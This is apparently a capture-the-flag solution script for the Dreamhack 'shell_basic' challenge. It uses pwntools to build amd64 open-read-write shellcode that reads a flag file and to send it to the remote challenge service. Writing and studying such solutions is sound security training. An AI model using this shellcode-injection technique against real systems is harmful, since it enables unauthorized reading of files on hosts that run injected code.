from pwn import *

r = remote("host3.dreamhack.games",22776)
path = "/home/shell_basic/flag_name_is_loooooong"

context.arch = "amd64"

shellcode = shellcraft.open(path)
shellcode += shellcraft.read('rax','rsp',64)
shellcode += shellcraft.write(1, 'rsp',64)

r.recvuntil("shellcode: ")
r.sendline(asm(shellcode))
print(r.recv())
